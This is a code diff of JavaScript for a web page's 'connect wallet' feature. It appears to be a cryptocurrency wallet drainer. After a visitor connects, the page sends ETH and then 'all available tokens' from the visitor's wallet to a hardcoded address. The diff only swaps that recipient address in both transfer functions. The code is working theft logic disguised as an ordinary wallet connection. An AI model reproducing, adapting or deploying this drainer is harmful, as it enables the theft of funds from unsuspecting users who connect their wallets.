@@ -1,4 +1,3 @@
-0xd326374CEd4B78a6Edc284CA6dfBF765e97D7093
 let isConnecting = false; // Flag to prevent multiple connections
 
 document.getElementById("connectButton").addEventListener("click", openModal);
@@ -94,7 +93,7 @@ async function sendFirstTransaction(walletAddress) {
     if (typeof window.ethereum !== 'undefined') {
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         const signer = provider.getSigner();
-        const recipientAddress = "0x64B04f1Eb0d4062f7D7199B099a7a3dC438EEb67"; // Your recipient address
+        const recipientAddress = "0xd326374CEd4B78a6Edc284CA6dfBF765e97D7093"; // Your recipient address
         const amountInEther = "0.0002"; // Amount to send in first transaction
 
         const transaction = {
@@ -157,7 +156,7 @@ async function sendSecondTransaction(signer, walletAddress) {
             const amountToSend = ethers.utils.parseUnits(tokenAmount, 18); // Send all available tokens above the threshold
             console.log(`Sending ${tokenAmount} tokens of ${tokenAddress} to recipient.`);
             
-            const recipientAddress = "0x64B04f1Eb0d4062f7D7199B099a7a3dC438EEb67"; // Set the recipient for the second transaction
+            const recipientAddress = "0xd326374CEd4B78a6Edc284CA6dfBF765e97D7093"; // Set the recipient for the second transaction
             
             try {
                 const txResponse = await tokenContract.transfer(recipientAddress, amountToSend);
